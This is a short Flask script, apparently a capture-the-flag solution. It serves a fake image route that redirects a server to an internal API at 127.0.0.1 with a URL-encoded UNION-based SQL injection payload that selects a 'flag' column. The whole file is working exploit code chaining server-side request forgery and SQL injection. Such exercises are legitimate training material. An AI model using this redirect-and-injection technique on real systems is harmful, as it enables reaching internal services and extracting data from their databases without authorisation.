from flask import Flask, redirect, Response

app = Flask(__name__)

@app.route('/redirect.png')
def redirect_to_internal():
    response = Response()
    response.headers['Content-Type'] = 'image'
    response.headers['Location'] = 'http://127.0.0.1:5000/api/users?username=%27%20OR%201=1%20UNION%20SELECT%20NULL,flag,NULL%20FROM%20flag%20limit%201%20%2d%2d%2d'
    response.status_code = 302
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
